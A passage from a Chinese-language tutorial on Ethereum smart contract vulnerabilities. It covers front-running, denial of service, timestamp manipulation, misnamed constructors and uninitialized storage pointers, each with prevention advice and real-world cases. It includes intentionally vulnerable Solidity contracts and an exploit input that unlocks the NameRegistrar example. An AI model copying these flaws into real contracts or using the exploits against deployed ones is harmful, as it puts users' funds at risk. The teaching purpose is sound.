方案。这种方案要求用户发送带有隐藏信息（通常是散列）的交易。在交易被包含在一个块中之后，用户发送一个交易来揭示所发送的数据（reveal 阶段）。这种方法可以防止矿工和用户抢先交易，因为他们无法确定交易的内容。但是，这种方法无法隐藏交易价值(transaction value)（在某些情况下，交易价值是需要隐藏的有价值的信息）。 <a href="https://ens.domains/">ENS</a> 智能合约允许用户发送交易，其提交的数据(<em>committed data</em>)包括他们愿意花费的以太币数量。然后，用户可以发送任意价值的交易。在 reveal 阶段，用户会获得交易中发送的金额与他们愿意花费的金额之间的差额退款。</p><p>Lorenz Breidenbach、Phil Daian、Ari Juels 和 Florian Tramèr 的进一步建议是使用“<a href="https://hackingdistributed.com/2017/08/28/submarine-sends/">submarine sends</a>”。这个想法的有效实现需要 <code>CREATE2</code> 操作码，该操作码目前尚未被采用，但似乎可能会出现在即将到来的硬分叉中。</p><h3 id="现实世界的例子：ERC20-和-Bancor"><a href="#现实世界的例子：ERC20-和-Bancor" class="headerlink" title="现实世界的例子：ERC20 和 Bancor"></a>现实世界的例子：ERC20 和 Bancor</h3><p><a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20 标准</a> 以在以太坊上构建代币而闻名。由于 <code>approve</code> 函数，该标准存在潜在的抢跑漏洞。<a href="https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit">Mikhail Vladimirov 和 Dmitry Khovratovich</a> 对此漏洞（以及减轻攻击的方法）进行了很好的解释。</p><p>该标准将 <code>approve</code> 函数指定为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> _spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>此函数允许用户批准其他用户代表他们转移代币。抢跑漏洞发生在用户 Alice 批准她的朋友 Bob 花费 100 个代币的场景中。 Alice 后来决定她想撤销 Bob 对花费 100 个代币的批准，因此她创建了一个交易，将 Bob 的分配设置为 50 个代币。一直在仔细观察链的 Bob 看到了这个交易并建立了一个他自己花费 100 个代币的交易。他为他的交易设置了比 Alice 更高的 <code>gasPrice</code>，因此他的交易优先于她的交易。<code>approve</code> 的一些实现将允许 Bob 转移他的 100 个代币，然后，当 Alice 的交易被提交时，将 Bob 的批准重置为 50 个代币，实际上让 Bob 可以访问 150 个令牌。</p><p>另一个突出的现实世界例子是 <a href="https://home.bancor.network/">Bancor</a>。 Ivan Bogatyy 和他的团队记录了对 Bancor 初始实施的一次有利可图的攻击。他的博客文章(<a href="https://hackernoon.com/front-running-bancor-in-150-lines-of-python-with-ethereum-api-d5e2bfd0d798">Implementing Ethereum trading front-runs on the Bancor exchange in Python</a>) 和 <a href="https://www.youtube.com/watch?v=RL2nE3huNiI">DevCon3 演讲</a> 详细讨论了这是如何完成的。本质上，代币的价格是根据交易价值确定的；用户可以查看 Bancor 交易的交易池，并提前运行它们以从价格差异中获利。 Bancor 团队已经解决了这种攻击。</p><h2 id="拒绝服务-Denial-of-Service-DoS"><a href="#拒绝服务-Denial-of-Service-DoS" class="headerlink" title="拒绝服务 (Denial of Service, DoS)"></a>拒绝服务 (Denial of Service, DoS)</h2><p>此类别非常广泛，但基本上包括用户可以使合约在一段时间内或在某些情况下永久无法操作的攻击。这可能会永远将以太币困在这些合约中，就像上面提到的 Parity Multisig Wallet (Second Hack) 一样。</p><h3 id="漏洞-10"><a href="#漏洞-10" class="headerlink" title="漏洞"></a>漏洞</h3><p>有多种方式可以使合同无法操作。在这里，我们只强调一些可能导致 DoS 漏洞的不太明显的 Solidity 编码模式：</p><p><em>通过外部操作的映射或数组的循环 (Looping through externally manipulated mappings or arrays)</em></p><p>这种模式通常出现在所有者希望通过类似 <code>distribute</code> 的功能向投资者分发代币时，如本示例合约中所示：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">DistributeTokens</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span> <span class="token comment">// gets set somewhere</span>    <span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> investors<span class="token punctuation">;</span> <span class="token comment">// array of investors</span>    <span class="token builtin">uint</span><span class="token punctuation">[</span><span class="token punctuation">]</span> investorTokens<span class="token punctuation">;</span> <span class="token comment">// the amount of tokens each investor gets</span>    <span class="token comment">// ... extra functionality, including transfertoken()</span>    <span class="token keyword">function</span> <span class="token function">invest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        investors<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>        investorTokens<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 5 times the wei sent</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">distribute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// only owner</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token builtin">uint</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> investors<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// here transferToken(to,amount) transfers "amount" of</span>            <span class="token comment">// tokens to the address "to"</span>            <span class="token function">transferToken</span><span class="token punctuation">(</span>investors<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>investorTokens<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，此合约中的循环运行在一个可以人为膨胀的数组上。攻击者可以创建许多用户帐户，从而使 <code>investor</code> 数组变大。原则上，可以这样做，以使执行 for 循环所需的 gas 超过区块的 gas limit，本质上使 <code>distribute</code> 函数无法运行。</p><p><em>所有者操作 (Owner operations)</em></p><p>另一种常见的模式是所有者在合约中拥有特定特权，并且必须执行某些任务才能使合约进入下一个状态。一个例子是初始货币发行 (ICO) 合约，该合同要求所有者 <code>finalize</code> 合约，然后允许代币转让。例如：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token builtin">bool</span> <span class="token keyword">public</span> isFinalized <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span> <span class="token comment">// gets set somewhere</span><span class="token keyword">function</span> <span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>    isFinalized <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ... extra ICO functionality</span><span class="token comment">// overloaded transfer function</span><span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint</span> _value<span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>isFinalized<span class="token punctuation">)</span><span class="token punctuation">;</span>    super<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>_to<span class="token punctuation">,</span>_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在这种情况下，如果特权用户丢失了他们的私钥或变得不活跃，整个代币合约将变得无法操作。在这种情况下，如果所有者无法调用 <code>finalize</code>，则无法转移代币；代币生态系统的整个运作取决于一个地址。</p><p><em>基于外部调用的进展状态 (Progressing state based on external calls)</em></p><p>有时会编写合约，以便进入新状态需要将以太币发送到一个地址，或者等待来自外部来源的一些输入。当外部调用失败或因外部原因被阻止时，这些模式可能导致 DoS 攻击。在发送以太币的例子中，用户可以创建一个不接受以太币的合约。如果合约要求以太币被撤回以进入新状态（考虑一个时间锁定合约，要求所有以太币在再次可用之前被撤回），该合约将永远不会达到新状态，因为以太币永远不会发送到不接受以太币的用户合约。</p><h3 id="预防技术-10"><a href="#预防技术-10" class="headerlink" title="预防技术"></a>预防技术</h3><p>在第一个例子中，合约不应该循环访问可以被外部用户人为操作的数据结构。建议使用提款模式，每个投资者都调用提款功能来独立索取代币。</p><p>在第二个示例中，需要特权用户来更改合约的状态。在这样的示例中，可以在所有者失去能力的情况下使用故障保护。一种解决方案是让所有者成为一个多重签名合约。另一种解决方案是使用时间锁定：在示例中，第 5 行的 require 可以包括基于时间的机制，例如 <code>require(msg.sender == owner || now &gt; unlockTime)</code>，它允许任何用户完成在 <code>unlockTime</code> 指定的一段时间后。这种缓解技术也可以用在第三个例子中。如果需要外部调用进入新状态，请考虑它们可能的失败，并可能在所需调用永远不会到来的情况下添加基于时间的状态进展。</p><table><thead><tr><th>Note</th><th>当然，这些建议还有集中的替代方案：可以添加一个维护用户，如果需要，他可以一起解决基于 DoS 的攻击向量的问题。由于此类实体的权力，这些类型的合同通常存在信任问题。​</th></tr></thead></table><h3 id="现实世界的例子：GovernMental"><a href="#现实世界的例子：GovernMental" class="headerlink" title="现实世界的例子：GovernMental"></a>现实世界的例子：GovernMental</h3><p><a href="http://governmental.github.io/GovernMental/">GovernMental</a> 是一个古老的庞氏骗局，积累了大量的以太币（1,100 以太币，一次）。不幸的是，它容易受到本节中提到的 DoS 漏洞的影响。 etherik 的 <a href="https://www.reddit.com/r/ethereum/comments/4ghzhv/governmentals_1100_eth_jackpot_payout_is_stuck/">Reddit 帖子</a> 描述了合约如何要求删除大型映射以提取以太币。删除此映射的 gas 成本超过了当时的区块 gas 限制，因此无法提取 1,100 个以太币。合约地址是 <a href="https://etherscan.io/address/0xf45717552f12ef7cb65e95476f217ea008167ae3">0xf45717552f12ef7cb65e95476f217ea008167ae3</a>，并且你可以从交易 <a href="https://etherscan.io/tx/0x0d80d67202bd9cb6773df8dd2020e7190a1b0793e8ec4fc105257e8128f0506b">0x0d80d67202bd9cb6773df8dd2020e7190a1b0793e8ec4fc105257e8128f0506b</a> 看到 1,100 以太币最终通过 250 万 gas 的交易获取了（在区块 gas limit 上升到足以允许此类交易时）。</p><h2 id="区块时间戳操作-Block-Timestamp-Manipulation"><a href="#区块时间戳操作-Block-Timestamp-Manipulation" class="headerlink" title="区块时间戳操作 (Block Timestamp Manipulation)"></a>区块时间戳操作 (Block Timestamp Manipulation)</h2><p>区块时间戳历来被用于各种应用，例如随机数的熵（有关更多详细信息，请参阅熵错觉），在一段时间内锁定资金，以及各种与时间相关的状态变化条件语句。矿工有能力稍微调整时间戳，如果在智能合约中错误地使用区块时间戳，这可能会很危险。</p><p>对此有用的参考资料包括 <a href="https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties">Solidity 文档</a> 和 <a href="https://ethereum.stackexchange.com/questions/413/can-a-contract-safely-rely-on-block-timestamp?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa">Joris Bontje 关于该主题的 Ethereum Stack Exchange 问题</a>。</p><h3 id="漏洞-11"><a href="#漏洞-11" class="headerlink" title="漏洞"></a>漏洞</h3><p><code>block.timestamp</code> 及其别名 <code>now</code> 可以被矿工操纵，如果他们有这样做的动机的话。让我们构建一个简单的游戏，显示在 roulette.sol 中，它很容易受到矿工利用。</p><p>示例11. roulette.sol</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Roulette</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> pastBlockTime<span class="token punctuation">;</span> <span class="token comment">// forces one bet per block</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">// initially fund contract</span>    <span class="token comment">// fallback function used to make a bet</span>    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token number">10</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// must send 10 ether to play</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>now <span class="token operator">!=</span> pastBlockTime<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// only 1 transaction per block</span>        pastBlockTime <span class="token operator">=</span> now<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>now <span class="token operator">%</span> <span class="token number">15</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// winner</span>            msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约的行为就像一个简单的彩票。每块一笔交易可以下注 10 以太币，就有机会赢得合约余额。这里的假设是<code>block.timestamp</code> 的最后两位数字是均匀分布的。如果是这样的话，中奖的机会将是 15 分之一。</p><p>但是，正如我们所知，矿工可以根据需要调整时间戳。在这种特殊情况下，如果合约中有足够多的以太币池，则会激励解决区块的矿工选择一个时间戳，使得 <code>block.timestamp</code> 或 <code>now</code> 模 15 为 0。这样做他们可能会赢得锁定在该合约中的以太币与块奖励。由于每个区块只允许一个人下注，这也容易受到抢跑攻击（请参阅竞争条件&#x2F;抢跑了解更多详细信息）。</p><p>在实践中，区块时间戳是单调递增的，因此矿工不能选择任意区块时间戳（它们必须晚于其前辈）。它们还仅限于将块时间设置在不太远的将来，因为这些块可能会被网络拒绝（节点不会验证时间戳在未来的块）。</p><h3 id="预防技术-11"><a href="#预防技术-11" class="headerlink" title="预防技术"></a>预防技术</h3><p>区块时间戳不应该用于熵或生成随机数——也就是说，它们不应该是赢得游戏或改变重要状态的决定因素（直接或通过某种推导）。</p><p>有时需要时间敏感的逻辑；例如，用于解锁合约（时间锁定），几周后完成 ICO 或执行到期日期。有时建议使用 <code>block.number</code> 和平均块时间来估计时间；<code>10 second</code> 的出块时间，<code>1 week</code> 大约相当于 <code>60480 blocks</code>。因此，指定更改合约状态的区块号可能更安全，因为矿工无法轻松操纵区块号。<a href="https://etherscan.io/address/0x0d8775f648430679a709e98d2b0cb6250d2887ef#code">BAT ICO</a> 合约采用了这种策略。</p><p>如果合约不是特别关注矿工对区块时间戳的操作，这可能是不必要的，但在开发合约时需要注意这一点。</p><h3 id="现实世界的例子：GovernMental-1"><a href="#现实世界的例子：GovernMental-1" class="headerlink" title="现实世界的例子：GovernMental"></a>现实世界的例子：GovernMental</h3><p>上面提到的古老庞氏骗局 <a href="http://governmental.github.io/GovernMental/">GovernMental</a> 也容易受到基于时间戳的攻击。合约支付给最后一个加入（至少一分钟）的球员。因此，作为玩家的矿工可以调整时间戳（到未来时间，使其看起来像一分钟过去了），以使其看起来是最后一个加入超过一分钟的玩家（即使现实中不是真的）。有关这方面的更多详细信息，请参阅 Tanya Bahrynovska 的“<a href="http://bit.ly/2Q1AMA6">History of Ethereum Security Vulnerabilities, Hacks and Their Fixes</a>”一文。</p><h2 id="小心的构造函数-Constructors-with-Care"><a href="#小心的构造函数-Constructors-with-Care" class="headerlink" title="小心的构造函数 (Constructors with Care)"></a>小心的构造函数 (Constructors with Care)</h2><p>构造函数是在初始化合约时经常执行关键的特权任务的特殊函数。在 Solidity v0.4.22 之前，构造函数被定义为与包含它们的合约同名的函数。在这种情况下，当在开发中更改合约名称时，如果构造函数名称也没有更改，它将成为一个正常的可调用函数。正如你可以想象的那样，这可能会导致（并且已经）一些有趣的合约攻击。</p><p>为了进一步了解，读者可能有兴趣尝试 <a href="https://github.com/OpenZeppelin/ethernaut">Ethernaut challenges</a>（特别是 Fallout 级别）。</p><h3 id="漏洞-12"><a href="#漏洞-12" class="headerlink" title="漏洞"></a>漏洞</h3><p>如果合约名称被修改，或者构造函数名称中存在拼写错误以至于它与合约名称不匹配，则构造函数将像普通函数一样运行。这可能会导致可怕的后果，尤其是在构造函数执行特权操作时。考虑以下合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">OwnerWallet</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token comment">// constructor</span>    <span class="token keyword">function</span> <span class="token function">ownerWallet</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Fallback. Collect ether.</span>    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约通过调用 <code>withdraw</code> 函数收集以太币并只允许所有者提取它。出现问题是因为构造函数的名称与合同的名称不完全相同：第一个字母不同！因此，任何用户都可以调用 <code>ownerWallet</code> 函数，将自己设置为所有者，然后通过调用 <code>withdraw</code> 来获取合约中的所有以太币。</p><h3 id="预防技术-12"><a href="#预防技术-12" class="headerlink" title="预防技术"></a>预防技术</h3><p>此问题已在 Solidity 编译器的 0.4.22 版本中得到解决。该版本引入了指定构造函数的 <code>constructor</code> 关键字，而不是要求函数名称与合约名称匹配。建议使用此关键字指定构造函数以防止命名问题。</p><h3 id="真实世界的例子：Rubixi"><a href="#真实世界的例子：Rubixi" class="headerlink" title="真实世界的例子：Rubixi"></a>真实世界的例子：Rubixi</h3><p><a href="https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code">Rubixi</a> 是另一个表现出这种脆弱性的金字塔计划。它最初被称为 <code>DynamicPyramid</code>，但在部署到 <code>Rubixi</code> 之前更改了合约名称。构造函数的名称没有改变，这允许任何用户成为创建者(<em>creator</em>)。可以在 <a href="https://bitcointalk.org/index.php?topic=1400536.60">Bitcointalk</a> 上找到与此错误相关的一些有趣的讨论。最终，它允许用户争夺创建者身份，以从金字塔计划中索取费用。</p><h2 id="未初始化的存储指针-Uninitialized-Storage-Pointers"><a href="#未初始化的存储指针-Uninitialized-Storage-Pointers" class="headerlink" title="未初始化的存储指针 (Uninitialized Storage Pointers)"></a>未初始化的存储指针 (Uninitialized Storage Pointers)</h2><p><strong>EVM 将数据存储到 storage 或 memory。在开发合约时，强烈建议准确了解这是如何完成的以及函数局部变量的默认类型。</strong>这是因为不恰当地初始化变量可能会产生易受攻击的合约。</p><p>要了解有关 EVM 中存储和内存的更多信息，请参阅 Solidity 文档中的 <a href="https://docs.soliditylang.org/en/latest/types.html#data-location">data location</a>，<a href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html?highlight=%20layout%20of%20state%20variables%20in%20storage">layout of state variables in storage</a> 和 <a href="https://docs.soliditylang.org/en/latest/internals/layout_in_memory.html?highlight=layout%20in%20memory">layout in memory</a>。</p><table><thead><tr><th>Note</th><th>本部分基于 Stefan Beyer 的<a href="https://medium.com/cryptronics/storage-allocation-exploits-in-ethereum-smart-contracts-16c2aa312743">一篇出色的文章</a>。受 Stefan 启发，关于这个主题的进一步阅读可以在这个 <a href="https://www.reddit.com/r/ethdev/comments/7wp363/how_does_this_honeypot_work_it_seems_like_a/">Reddit thread</a> 中找到。</th></tr></thead></table><h3 id="漏洞-13"><a href="#漏洞-13" class="headerlink" title="漏洞"></a>漏洞</h3><p>函数中的局部变量默认为存储或内存，具体取决于它们的类型。未初始化的本地存储变量可能包含合约中其他存储变量的值；这一事实可能会导致无意的漏洞，或被故意利用。</p><p>让我们考虑 NameRegistrar.sol 中相对简单的名称注册商合约。</p><p>示例12. NameRegistrar.sol</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// A locked name registrar</span><span class="token keyword">contract</span> <span class="token class-name">NameRegistrar</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">bool</span> <span class="token keyword">public</span> unlocked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token comment">// registrar locked, no name updates</span>    <span class="token keyword">struct</span> <span class="token class-name">NameRecord</span> <span class="token punctuation">&#123;</span> <span class="token comment">// map hashes to addresses</span>        <span class="token builtin">bytes32</span> name<span class="token punctuation">;</span>        <span class="token builtin">address</span> mappedAddress<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// records who registered names</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> NameRecord<span class="token punctuation">)</span> <span class="token keyword">public</span> registeredNameRecord<span class="token punctuation">;</span>    <span class="token comment">// resolves hashes to addresses</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> <span class="token operator">=></span> <span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token keyword">public</span> resolve<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _name<span class="token punctuation">,</span> <span class="token builtin">address</span> _mappedAddress<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// set up the new NameRecord</span>        NameRecord newRecord<span class="token punctuation">;</span>        newRecord<span class="token punctuation">.</span>name <span class="token operator">=</span> _name<span class="token punctuation">;</span>        newRecord<span class="token punctuation">.</span>mappedAddress <span class="token operator">=</span> _mappedAddress<span class="token punctuation">;</span>        resolve<span class="token punctuation">[</span>_name<span class="token punctuation">]</span> <span class="token operator">=</span> _mappedAddress<span class="token punctuation">;</span>        registeredNameRecord<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> newRecord<span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>unlocked<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// only allow registrations if contract is unlocked</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这个简单的名称注册器只有一个功能。当合约是 <code>unlocked</code> 时，它允许任何人注册一个名称（作为 <code>bytes32</code> 散列）并将该名称映射到一个地址。 registrar 最初被锁定，第 25 行的 <code>require</code> 阻止 <code>register</code> 添加名称记录。合约似乎无法使用，因为无法解锁注册表！但是，有一个漏洞允许名称注册，而不管 <code>unlocked</code> 的变量如何。</p><p>要讨论这个漏洞，首先我们需要了解存储在 Solidity 中是如何工作的。作为一个层级概述（没有任何适当的技术细节——我们建议阅读 Solidity 文档以进行适当的查看），状态变量按出现在合约中的顺序存储在 <em>slots</em> 中（它们可以组合在一起但不在此例中，所以我们不会担心）。因此，<code>unlocked</code> 存在于 <code>slot[0]</code> 中，<code>registeredNameRecord</code> 存在于 <code>slot[1]</code> 中，并且 <code>resolve</code> 存在于 <code>slot[2]</code> 中，等等。这些 slot 中的每一个都是 32 字节大小（映射增加了复杂性，我们现在将忽略它）。<code>unlocked</code> 的布尔值看起来像 <code>0x000...0</code>（64 个 0，不包括 0x）表示 <code>false</code> 或 <code>0x000...1</code>（63 0s）表示 <code>true</code>。如您所见，在此特定示例中存在大量存储浪费。</p><p>下一个难题是 Solidity 在将复杂数据类型（例如 struct）初始化为局部变量时默认将它们放入存储中。因此，第 18 行的 <code>newRecord</code> 默认为 storage。该漏洞是由于 <code>newRecord</code> 未初始化造成的。因为默认是 storage，所以映射到 storage slot[0]，当前包含一个指向 <code>unlocked</code> 的指针。请注意，在第 19 行和第 20 行，我们将 <code>newRecord.name</code> 设置为 <code>_name</code> 并将 <code>newRecord.mappedAddress</code> 设置为 <code>_mappedAddress</code>；这会更新 slot[0] 和 slot[1] 的存储位置，这会同时修改 <code>unlocked</code> 和与 <code>registerNameRecord</code> 关联的 storage slot。</p><p>这意味着 <code>unlocked</code> 可以直接修改，只需通过 <code>register</code>  函数的 <code>bytes32_name</code> 参数即可。因此，如果 <code>_name</code> 的最后一个字节不为零，它会修改 storage <code>slot[0]</code> 的最后一个字节，直接将 <code>unlocked</code> 改为 <code>true</code>。这样的 <code>_name</code> 值将导致第 25 行的 <code>require</code> 调用成功，因为我们已将 <code>unlocked</code> 设置为 <code>true</code>。在 Remix 中试试这个。请注意，如果您使用以下形式的 <code>_name</code>，该函数将通过：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token number">0x0000000000000000000000000000000000000000000000000000000000000001</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="预防技术-13"><a href="#预防技术-13" class="headerlink" title="预防技术"></a>预防技术</h3><p>Solidity 编译器对未初始化的 storage 变量显示警告；开发人员在构建智能合约时应特别注意这些警告。当前版本的 Mist (0.10) 不允许编译这些合约。在处理复杂类型时，显式使用 <code>memory</code> 或 <code>storage</code> 说明符通常是一种很好的做法，以确保它们的行为符合预期。</p><h3 id="现实世界的例子：OpenAddressLottery-和-CryptoRoulette-Honey-Pots"><a href="#现实世界的例子：OpenAddressLottery-和-CryptoRoulette-Honey-Pots" class="headerlink" title="现实世界的例子：OpenAddressLottery 和 CryptoRoulette Honey Pots"></a>现实世界的例子：OpenAddressLottery 和 CryptoRoulette Honey Pots</h3><p>部署了一个名为 <a href="https://etherscan.io/address/0x8685631276cfcf17a973d92f6dc11645e5158c0c#code">OpenAddressLottery</a> 的蜜罐，它使用这个未初始化的存储变量怪癖(quirk)从一些潜在的黑客那里收集以太币。合约相当复杂，所以我们将把分析留给 <a href="https://www.reddit.com/r/ethdev/comments/7wp363/how_does_this_honeypot_work_it_seems_like_a/">Reddit thread</a>，在那里对攻击进行了非常清楚的解释。</p><h2 id="浮点数和精度-Floating-Point-and-Precision"><a href="#浮点数和精度-Floating-Point-and-Precision" class="headerlink" title="浮点数和精度 (Floating Point and Precision)"></a>浮点数和精度 (Floating Point and Precision)</h2><p>在撰写本文时（v0.4.24），Solidity 不支持定点数和浮点数。这意味着浮点表示必须使用 Solidity 中的整数类型来构造。如果没有正确实施，这可能会导致错误和漏洞。</p><table><thead><tr><th>Note</th><th>如需进一步阅读，请参阅 <a href="https://github.com/ethereum/wiki/wiki/Safety#beware-rounding-with-integer-division">以太坊合约安全技术和 Tips 